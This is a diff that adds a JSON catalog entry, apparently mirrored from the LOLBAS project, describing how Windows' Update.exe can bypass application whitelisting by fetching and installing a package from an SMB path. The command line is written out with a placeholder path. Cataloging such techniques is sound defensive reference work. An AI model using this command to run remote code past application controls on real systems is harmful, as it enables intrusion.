@@ -1,0 +1,23 @@
+{
+  "id": "lolbas-update-exe-awl-bypass-2",
+  "name": "LOLBAS · Update.exe (AWL Bypass) #2",
+  "command": "Update.exe --update={PATH_SMB:folder}",
+  "description": "The above binary will go to url and look for RELEASES file, download and install the nuget package via SAMBA.",
+  "platform": "windows",
+  "tags": [
+    "lolbas",
+    "update",
+    "awl-bypass"
+  ],
+  "source": "lolbas",
+  "source_url": "https://lolbas-project.github.io/lolbas/Update/",
+  "upstream_id": "Update.exe/AWL Bypass/1",
+  "category": "lolbas",
+  "subcategory": "awl-bypass",
+  "references": [
+    {
+      "title": "LOLBAS — Update.exe",
+      "url": "https://lolbas-project.github.io/lolbas/Update/"
+    }
+  ]
+}
